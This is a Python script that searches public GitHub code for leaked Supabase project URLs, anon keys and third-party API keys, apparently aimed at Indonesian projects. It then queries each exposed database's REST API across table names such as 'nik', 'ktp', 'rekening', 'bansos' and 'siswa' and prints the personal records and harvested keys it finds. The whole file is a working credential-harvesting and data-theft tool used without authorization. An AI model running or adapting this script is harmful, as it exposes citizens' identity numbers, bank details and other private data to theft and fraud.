#!/usr/bin/env python3
"""supa_hunt2.py — widen: cari Supabase RLS-off + keyed-API key leaks (Indonesia)."""
import subprocess, re, json, urllib.parse, urllib.request

def gh(args, t=60):
    return subprocess.run(["gh", *args], capture_output=True, text=True, timeout=t).stdout

def code_search(q, n=25):
    try:
        d = json.loads(gh(["api", f"https://api.github.com/search/code?q={urllib.parse.quote(q)}&per_page={n}"]))
    except Exception:
        return []
    return [(it["repository"]["full_name"], it["path"]) for it in d.get("items", [])]

def raw(repo, path):
    for br in ("main", "master", "HEAD"):
        try:
            return urllib.request.urlopen(f"https://raw.githubusercontent.com/{repo}/{br}/{path}", timeout=20).read().decode("utf-8", "replace")
        except Exception:
            continue
    return ""

def keys(txt):
    urls = set(re.findall(r"https://([a-z0-9]{20})\.supabase\.co", txt))
    anon = set(re.findall(r"eyJ[A-Za-z0-9_\-]{20,}\.[A-Za-z0-9_\-]{20,}\.[A-Za-z0-9_\-]{20,}", txt))
    coid = set(re.findall(r"x-api-co-id['\"]?\s*[:=]\s*['\"]([A-Za-z0-9_\-]{8,})", txt))
    wrid = set(re.findall(r"X-API-Key['\"]?\s*[:=]\s*['\"]([A-Za-z0-9_\-]{8,})", txt))
    return urls, anon, coid, wrid

TABLES = ["employees","pegawai","users","profiles","accounts","rekening","tax_engine","data",
          "warga","penduduk","karyawan","nasabah","hasil","orders","members","customers",
          "identitas","nik","ktp","data_warga","bansos","penerima","santri","siswa","guru"]

QUERIES = [
    '"supabase.co" "nik" "nama"',
    '"supabase.co" "rekening"',
    '"supabase.co" "nomor_hp"',
    '"supabase.co" "ktp" indonesia',
    '"supabase.co" "alamat" nik',
    '"VITE_SUPABASE_URL" "anon"',
    '"x-api-co-id"',
    '"restapi.web.id"',
    '"supabase.co" "data_warga" OR "penduduk"',
    '"supabase.co" "no_rekening" OR "norek"',
]

def main():
    seen=set(); hits=[]
    for q in QUERIES:
        for repo, path in code_search(q):
            if (repo,path) in seen: continue
            seen.add((repo,path))
            txt=raw(repo,path)
            urls,anon,coid,wrid=keys(txt)
            for u in urls:
                for k in anon:
                    found={}
                    for t in TABLES:
                        try:
                            r=urllib.request.urlopen(urllib.request.Request(
                                f"https://{u}.supabase.co/rest/v1/{t}?select=*&limit=2",
                                headers={"apikey":k,"Authorization":"Bearer "+k}), timeout=12)
                            b=r.read().decode("utf-8","replace")
                            if b.strip() not in ("[]","","null"): found[t]=b[:300]
                        except Exception: pass
                    if found:
                        hits.append({"repo":repo,"proj":u,"tables":list(found)})
                        print(f"[RLS-OFF] {repo} -> {u} {list(found)}"); 
                        for t,b in found.items(): print(f"   {t}: {b[:220]}")
            for label,ks in (("api.co.id",coid),("restapi",wrid)):
                for kk in ks:
                    print(f"[{label} key] {repo}/{path}: {kk[:60]}"); 
                    hits.append({"repo":repo,"path":path,"kind":label,"key":kk})
    json.dump(hits, open("/tmp/supa_hits2.json","w"), indent=1)
    print("done. hits:", len(hits))

if __name__=="__main__": main()
